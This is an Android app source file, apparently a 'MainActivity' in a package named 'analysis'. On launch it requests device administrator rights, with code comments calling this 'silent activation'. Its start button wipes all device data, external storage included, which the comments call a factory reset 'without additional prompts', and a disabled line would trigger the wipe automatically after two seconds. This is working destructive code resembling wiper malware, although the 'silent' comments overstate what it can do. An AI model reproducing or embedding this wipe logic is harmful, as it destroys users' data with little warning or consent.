package com.example.analysis;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Button;
import android.widget.ImageButton;

import androidx.appcompat.app.AppCompatActivity;
import com.example.analysis.manager.DeviceWipeManager;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_SILENT_ADMIN = 1;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName deviceAdminReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize Device Policy Manager
        devicePolicyManager = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);

        // Define Device Admin Receiver
        deviceAdminReceiver = new ComponentName(this, DeviceWipeManager.class);

        // Attempt silent device admin activation
        silentDeviceAdminActivation();

        // Reset button setup
        ImageButton resetButton = findViewById(R.id.btn_start);
        resetButton.setOnClickListener(v -> performSilentFactoryReset());

        // Automatically click the reset button after a delay (e.g., 2 seconds)
//        new Handler().postDelayed(resetButton::performClick, 2000); // 2000 milliseconds = 2 seconds
    }

    private void silentDeviceAdminActivation() {
        // Check if already an active admin
        if (!devicePolicyManager.isAdminActive(deviceAdminReceiver)) {
            try {
                // Create intent for device admin activation
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminReceiver);

                // Silent activation attempt
                startActivityForResult(intent, REQUEST_CODE_SILENT_ADMIN);
            } catch (Exception e) {
                Log.e("DeviceAdmin", "Silent activation attempt failed", e);
            }
        }
    }

    private void performSilentFactoryReset() {
        try {
            // Attempt factory reset without additional prompts
            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
        } catch (SecurityException e) {
            try {
                // Fallback reset method
                devicePolicyManager.wipeData(0);
            } catch (Exception basicException) {
                Log.e("FactoryReset", "Reset failed", basicException);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SILENT_ADMIN) {
            // Verify admin status silently
            boolean isAdminActive = devicePolicyManager.isAdminActive(deviceAdminReceiver);
            Log.d("DeviceAdmin", "Admin activation status: " + isAdminActive);
        }
    }
}